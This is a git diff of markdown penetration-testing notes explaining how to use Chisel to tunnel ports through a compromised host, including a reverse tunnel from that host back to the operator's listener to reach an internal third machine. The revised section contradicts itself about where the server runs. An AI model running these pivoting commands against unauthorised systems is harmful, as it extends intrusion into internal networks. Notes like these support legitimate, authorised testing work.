@@ -18,18 +18,18 @@ Remote
 
 ### Chisel
 - A: let compromised host access to a remote port, localhost is able to visit, but  compromised host cannot, in another word, this port only open for localhost
- server set on localhost, this listening IP is used for create tunnel
-`chisel server -p xxx`
- on compromised host:
-`chisel client localhostIP:port(you are listening) port(on compromised):3edhostIP:rport`
- on compromised host:
- `curl http://localhost:port(on compromised)`
+ server set on localhost, this listening IP is used for create tunnel <br>
+> on compromised host:<br>
+> `chisel server -p xxx`<br>
+> on local host: <br>
+> `chisel client serverIP:port(server listening) port(local host):target domainname(rIP):rport`<br>
+>  Access: `curl http://localhost:port(on compromised)`
 
-- B: localhost access a port open in the subnetwork where compromised host sits
-  server also set on localhost, this listening IP is used for create tunnel:
-	`chisel server -p xxx --reverse`
-on compromised host:
-	`chisel client localhostIP:port(you are listening) R:port(localhost):3edhostIP:port(3rd)`
-
- on localhost, access to port 3rd:
-	`curl http://localhost:port(localhost)`
+- B: localhost access a port open in the subnetwork where compromised host sits<br>
+>  server also set on localhost, this listening IP is used for create tunnel:<br>
+>	`chisel server -p xxx --reverse`<br>
+> on compromised host:<br>
+>	`chisel client localhostIP:port(you are listening) R:port(localhost):3edhostIP:port(3rd)`<br>
+>
+> on localhost, access to port 3rd:<br>
+>	`curl http://localhost:port(localhost)`
